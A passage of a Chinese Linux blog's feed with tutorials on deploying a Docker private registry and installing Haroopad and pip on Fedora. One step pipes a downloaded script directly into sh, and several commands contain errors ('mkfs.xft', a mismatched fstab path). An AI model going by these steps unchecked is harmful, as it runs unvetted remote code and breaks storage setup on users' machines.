  <entry>
    <title>Docker私有镜像仓库节点部署</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Docker%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/</id>
    <published>2017-05-02T09:42:29.000Z</published>
    <updated>2017-05-02T10:00:19.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。</p><h2 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h2><p>生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求：</p><table><thead><tr><th></th><th>最小</th><th>推荐</th><th>备注</th></tr></thead><tbody><tr><td>CPU</td><td>1 core</td><td>大于4 core</td><td></td></tr><tr><td>内存</td><td>1 GB</td><td>大于32 GB</td><td></td></tr><tr><td>磁盘</td><td>5 GB</td><td>大于120 GB</td><td>小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上</td></tr><tr><td>独立数据盘</td><td>RHEL/CentOS 需要 &gt; 5GB 独立数据盘</td><td>RHEL/CentOS 需要 &gt;30GB 独立数据盘</td><td>需要使用 devicemapper 的 direct-lvm 模式</td></tr><tr><td>网络</td><td>所有节点互通</td><td>所有节点互通, ping &lt;1ms</td><td>至少两块网卡</td></tr></tbody></table><p>##系统要求</p><p>系统推荐：CentOS 7.2 </p><p>内核推荐：大于3.10</p><p>注：默认第一块网卡为内网</p><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><ul><li><p>安装ntpd服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install ntp</span><br></pre></td></tr></table></figure></li><li><p>与上游ntp服务器进行时间同步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate 10.154.88.88</span><br></pre></td></tr></table></figure></li><li><p>配置ntp服务配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos;  /etc/ntp.conf</span><br></pre></td></tr></table></figure></li><li><p>启动ntpd服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable ntpd</span><br><span class="line">systemctl start ntpd</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置本地存储"><a href="#配置本地存储" class="headerlink" title="配置本地存储"></a>配置本地存储</h2><p>为方便后期维护管理，采用LVM对本地存储进行管理</p><ul><li><p>创建PV</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/sdb</span><br></pre></td></tr></table></figure></li><li><p>创建VG</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgcreate data /dev/sdb</span><br></pre></td></tr></table></figure></li><li><p>创建LV</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvcreate -L 500G data -n docker_data</span><br></pre></td></tr></table></figure></li><li><p>格式化新分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.xft /dev/data/docker_data</span><br></pre></td></tr></table></figure></li></ul><p>##系统更新</p><p>为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br></pre></td></tr></table></figure></p><p>##安装容器服务</p><ul><li><p>卸载系统默认（版本较老的）Docker环境包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y remove docker docker-common container-selinux</span><br><span class="line">yum -y remove docker-selinux</span><br></pre></td></tr></table></figure></li><li><p>配置官方软件仓库源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure></li><li><p>更新本地缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache fast</span><br></pre></td></tr></table></figure></li><li><p>查看软件包信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list docker-ce.x86_64  --showduplicates |sort -r</span><br></pre></td></tr></table></figure></li><li><p>安装Docker engine社区版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install docker-ce</span><br></pre></td></tr></table></figure></li></ul><h2 id="本地容器服务配置"><a href="#本地容器服务配置" class="headerlink" title="本地容器服务配置"></a>本地容器服务配置</h2><ul><li><p>启动容器服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure></li><li><p>设置开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure></li><li><p>设置容器数据存储路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">mv /var/lib/docker&#123;,.bak&#125;</span><br><span class="line">mkdir /var/lib/docker</span><br><span class="line">mount /dev/data/docker_data /var/lib/docker</span><br><span class="line">echo &quot;/dev/data/docker_data   /var/lib/docker         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</span><br></pre></td></tr></table></figure></li><li><p>配置加速器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>启动容器服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure></li><li><p>测试运行实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure></li></ul><h2 id="创建私有镜像仓库镜像存放分区"><a href="#创建私有镜像仓库镜像存放分区" class="headerlink" title="创建私有镜像仓库镜像存放分区"></a>创建私有镜像仓库镜像存放分区</h2><ul><li><p>创建LV</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvcreate -L 2000G data -n registry_data</span><br></pre></td></tr></table></figure></li><li><p>格式化新分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.xft /dev/data/registry_data</span><br></pre></td></tr></table></figure></li><li><p>挂载新分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount  /dev/data/registry_data /data/docker/registry/</span><br></pre></td></tr></table></figure></li><li><p>修改系统启动挂载分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/dev/data/registry_data  /data/registry_data         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</span><br></pre></td></tr></table></figure></li></ul><h2 id="启动私有镜像仓库"><a href="#启动私有镜像仓库" class="headerlink" title="启动私有镜像仓库"></a>启动私有镜像仓库</h2><p>registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest</span><br></pre></td></tr></table></figure><h2 id="私有镜像仓库测试"><a href="#私有镜像仓库测试" class="headerlink" title="私有镜像仓库测试"></a>私有镜像仓库测试</h2><ul><li>查看本地镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">busybox             latest              00f017a8c2a6        2 weeks ago         1.11 MB</span><br><span class="line">registry            latest              047218491f8c        2 weeks ago         33.2 MB</span><br></pre></td></tr></table></figure></li></ul><p>可以看到，本机共有两个容器镜像，分别是：registry和busybox</p><ul><li><p>重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag busybox 10.82.2.103:5000/busybox</span><br></pre></td></tr></table></figure></li><li><p>再次查看本地镜像<br>再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker images</span><br><span class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</span><br><span class="line">busybox                     latest              00f017a8c2a6        2 weeks ago         1.11 MB</span><br><span class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</span><br></pre></td></tr></table></figure></li><li><p>将本地镜像推送到本地仓库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 10.82.2.103:5000/busybox</span><br></pre></td></tr></table></figure></li><li><p>推送过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker push 10.82.2.103:5000/busybox</span><br><span class="line">The push refers to a repository [10.82.2.103:5000/busybox]</span><br><span class="line">c0de73ac9968: Pushed </span><br><span class="line">latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527</span><br></pre></td></tr></table></figure></li><li><p>查看本地仓库中的镜像列表</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  10.82.2.103:5000/v2/busybox/tags/list</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125;</span><br></pre></td></tr></table></figure></p><ul><li><p>删除本地busybox镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker rmi busybox</span><br><span class="line">Untagged: busybox:latest</span><br><span class="line">Untagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f</span><br><span class="line">[root@docker-registry ~]# docker images</span><br><span class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</span><br><span class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</span><br></pre></td></tr></table></figure></li><li><p>从私有仓库拉取镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker pull 10.82.2.103:5000/busybox</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from busybox</span><br><span class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</span><br><span class="line">Status: Image is up to date for 10.82.2.103:5000/busybox:latest</span><br></pre></td></tr></table></figure></li></ul><p>可以看到成功获取私有仓库中的镜像</p><ul><li><p>尝试从私有镜像仓库中拉取的镜像启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox </span><br><span class="line">/ # hostname </span><br><span class="line">11ea9195246f</span><br><span class="line">/ # hostid </span><br><span class="line">11ac0300</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure></li><li><p>在其他容器计算节点上进行测试<br>测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。</p><ul><li><p>拉取私有镜像仓库中的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[I] $ docker pull 10.82.2.103:5000/busybox</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from busybox</span><br><span class="line">04176c8b224a: Pull complete </span><br><span class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</span><br><span class="line">Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest</span><br></pre></td></tr></table></figure></li><li><p>查看拉取的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[I] $ docker images</span><br><span class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        13 days ago         1.11 MB</span><br><span class="line">ubuntu                      latest              4ca3a192ff2a        3 months ago        128.2 MB</span><br><span class="line">centos                      latest              0584b3d2cf6d        4 months ago        196.5 MB</span><br><span class="line">registry                    latest              c9bd19d022f6        5 months ago        33.27 MB</span><br><span class="line">[I] $ sudo ip add |grep 192</span><br><span class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</span><br><span class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</span><br></pre></td></tr></table></figure></li><li><p>从私有镜像仓库中拉取的镜像启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[I] $ sudo ip add |grep 192</span><br><span class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</span><br><span class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</span><br><span class="line">[I] $ docker run -i -t 10.82.2.103:5000/busybox</span><br><span class="line">/ # hostname &amp;&amp;hostid</span><br><span class="line">4ed4430a0b8d</span><br><span class="line">11ac0200</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>可以看到可以正常启动容器</p><p>至此，私有镜像仓库部署完成。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于本文&quot;&gt;&lt;a href=&quot;#关于本文&quot; class=&quot;headerlink&quot; title=&quot;关于本文&quot;&gt;&lt;/a&gt;关于本文&lt;/h2&gt;&lt;p&gt;本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。&lt;/p&gt;
&lt;h2 id=&quot;硬件要求&quot;&gt;&lt;a href=&quot;#硬件要求
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器私有仓库配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/tags/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Fedora安装Haroopad</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Fedora%E5%AE%89%E8%A3%85Haroopad/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/</id>
    <published>2017-05-02T08:59:14.000Z</published>
    <updated>2017-05-02T10:08:43.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。<br>然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；<br>值得一提的是，Haroopad在所有平台下都区分32/64位版本。</p><h2 id="介绍安装环境"><a href="#介绍安装环境" class="headerlink" title="介绍安装环境"></a>介绍安装环境</h2><p>我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。</p><h2 id="下载源码安装包："><a href="#下载源码安装包：" class="headerlink" title="下载源码安装包："></a>下载源码安装包：</h2><p><a href="https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz" target="_blank" rel="noopener">官方下载地址为：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>将下载的软件包解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf haroopad-v0.13.1-x64.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>再将解压出来的软件包解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf data.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>将解压出来的文件复制到根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -rv ./usr /</span><br></pre></td></tr></table></figure></li><li><p>将另一个软件包也解压出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf control.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>将从control.tar.gz 中解压出来的文件添加可行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 postinst</span><br></pre></td></tr></table></figure></li><li><p>运行postinst</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./postinst</span><br></pre></td></tr></table></figure></li></ul><h2 id="创建“-desktop”-文件"><a href="#创建“-desktop”-文件" class="headerlink" title="创建“.desktop” 文件"></a>创建“.desktop” 文件</h2><p>使用以下命令创建“.desktop” 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF</span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=haroopad</span><br><span class="line">Version=0.13.1</span><br><span class="line">Exec=haroopad</span><br><span class="line">Comment=The Next Document processor based on Markdown</span><br><span class="line">Icon=haroopad</span><br><span class="line">Type=Application</span><br><span class="line">Terminal=false</span><br><span class="line">StartupNotify=true</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Categories=Development;GTK;GNOME;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="复制Hroopad-图标文件："><a href="#复制Hroopad-图标文件：" class="headerlink" title="复制Hroopad 图标文件："></a>复制Hroopad 图标文件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor</span><br></pre></td></tr></table></figure><h2 id="至此Hroopad安装完成。"><a href="#至此Hroopad安装完成。" class="headerlink" title="至此Hroopad安装完成。"></a>至此Hroopad安装完成。</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="Haroopad" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Haroopad/"/>
    
    
      <category term="Haroopad" scheme="http://blog.unixmen.cn/tags/Haroopad/"/>
    
      <category term="标记语言" scheme="http://blog.unixmen.cn/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>如何在Fedora中安装pip2或pip3</title>
    <link href="http://blog.unixmen.cn/2017/05/02/%E5%A6%82%E4%BD%95%E5%9C%A8Fedora%E4%B8%AD%E5%AE%89%E8%A3%85pip2%E6%88%96pip3/"/>
    <id>http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/</id>
    <published>2017-05-02T03:24:19.000Z</published>
    <updated>2017-05-02T10:11:04.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。</p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><ul><li><p>首先我们清空我们系统中残留冗余包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf clean all</span><br></pre></td></tr></table></figure></li><li><p>作为最佳体验，我们升级系统软件包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf update -y</span><br></pre></td></tr></table></figure></li></ul><h2 id="现在可以安装pip工具包了"><a href="#现在可以安装pip工具包了" class="headerlink" title="现在可以安装pip工具包了"></a>现在可以安装pip工具包了</h2><h3 id="pip2"><a href="#pip2" class="headerlink" title="pip2"></a>pip2</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf -y install python-pip</span><br></pre></td></tr></table></figure></p><ul><li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pip</span><br></pre></td></tr></table></figure></li></ul><h3 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf -y install python3-pip</span><br></pre></td></tr></table></figure></p><ul><li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -U pip</span><br></pre></td></tr></table></figure></li></ul><h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下：</p><h3 id="首先可以获取帮助文档"><a href="#首先可以获取帮助文档" class="headerlink" title="首先可以获取帮助文档"></a>首先可以获取帮助文档</h3><ul><li><p>如果仅仅pip2或着pip3可以通过以下命令进行验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --help</span><br></pre></td></tr></table></figure></li><li><p>假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证：</p><ul><li><p>如查看pip3的帮助文档：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 --help</span><br></pre></td></tr></table></figure></li><li><p>查看pip3的帮助文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 --help</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>其次还可以获取版本信息：</p><ul><li><p>pip2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 -V</span><br></pre></td></tr></table></figure></li><li><p>pip3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 -V</span><br></pre></td></tr></table></figure></li><li><p>你pip -V 命令将获取类似如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="Python" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Python/"/>
    
      <category term="pip" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/Python/pip/"/>
    
    
      <category term="pip" scheme="http://blog.unixmen.cn/tags/pip/"/>
    
      <category term="python" scheme="http://blog.unixmen.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证</title>
    <link href="http://blog.unixmen.cn/2017/03/29/%E9%80%9A%E8%BF%87%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81%E5%AE%9E%E7%8E%B0Linux%E7%B3%BB%E7%BB%9FSSH%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
